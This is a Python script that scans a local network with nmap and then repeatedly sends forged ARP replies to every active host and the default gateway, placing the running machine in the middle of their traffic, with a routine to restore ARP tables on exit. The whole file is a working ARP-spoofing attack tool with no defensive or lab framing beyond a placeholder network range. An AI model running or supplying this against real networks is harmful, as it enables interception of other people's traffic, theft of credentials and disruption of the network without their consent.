import nmap
from scapy.all import Ether, ARP, srp, send
import time


def get_mac(ip):
    """ Using ARP protocol to get MAC address """
    try:
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request
        answered_list = srp(packet, timeout=2, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except IndexError:
        print(f"[!] Could not find MAC address for IP: {ip}")
        return None
    except Exception as e:
        print(f"[!] Error in get_mac: {e}")
        return None


def spoof(target_ip, host_ip, verbose=True):
    """ Spoofing the target IP to think that the host IP is the target IP """
    try:
        target_mac = get_mac(target_ip)
        if not target_mac:
            print(f"[!] Skipping spoofing for {target_ip} as MAC address could not be resolved.")
            return
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')  # create fake ARP response
        send(arp_response, verbose=0)
        if verbose:  # print log if verbose is True
            self_mac = ARP().hwsrc
            print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
    except Exception as e:
        print(f"[!] Error in spoof: {e}")


def restore(target_ip, host_ip, verbose=True):
    """ Restore the network by sending the real MAC address of the host to the target IP """
    try:
        target_mac = get_mac(target_ip)
        host_mac = get_mac(host_ip)
        if not target_mac or not host_mac:
            print(f"[!] Skipping restore for {target_ip} or {host_ip} as MAC address could not be resolved.")
            return
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")  # real ARP packet
        send(arp_response, verbose=0, count=7)
        if verbose:  # print log if verbose is True
            print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
    except Exception as e:
        print(f"[!] Error in restore: {e}")


def scan_network(network):
    """ Scan the network for active hosts using nmap """
    nm = nmap.PortScanner()
    print(f"[+] Scanning network: {network}")
    nm.scan(hosts=network, arguments='-sn')  # Ping scan
    active_hosts = [host for host in nm.all_hosts() if nm[host].state() == 'up']
    print(f"[+] Active hosts found: {active_hosts}")
    return active_hosts


if __name__ == "__main__":
    network = "192.168.91.0/24"  # Replace with your network range
    host = "192.168.91.2"  # Default gateway / router
    verbose = True

    try:
        active_hosts = scan_network(network)
        active_hosts.remove(host)  # Exclude the router from the list of targets

        print("[+] Starting ARP spoofing...")
        while True:
            for target in active_hosts:
                spoof(target, host, verbose)  # Spoof each active host
                spoof(host, target, verbose)  # Spoof the router for each host
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C! Restoring the network...")
        for target in active_hosts:
            restore(target, host)  # Restore each active host
            restore(host, target)  # Restore the router
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        print("[!] Attempting to restore the network...")
        for target in active_hosts:
            restore(target, host)  # Restore each active host
            restore(host, target)  # Restore the router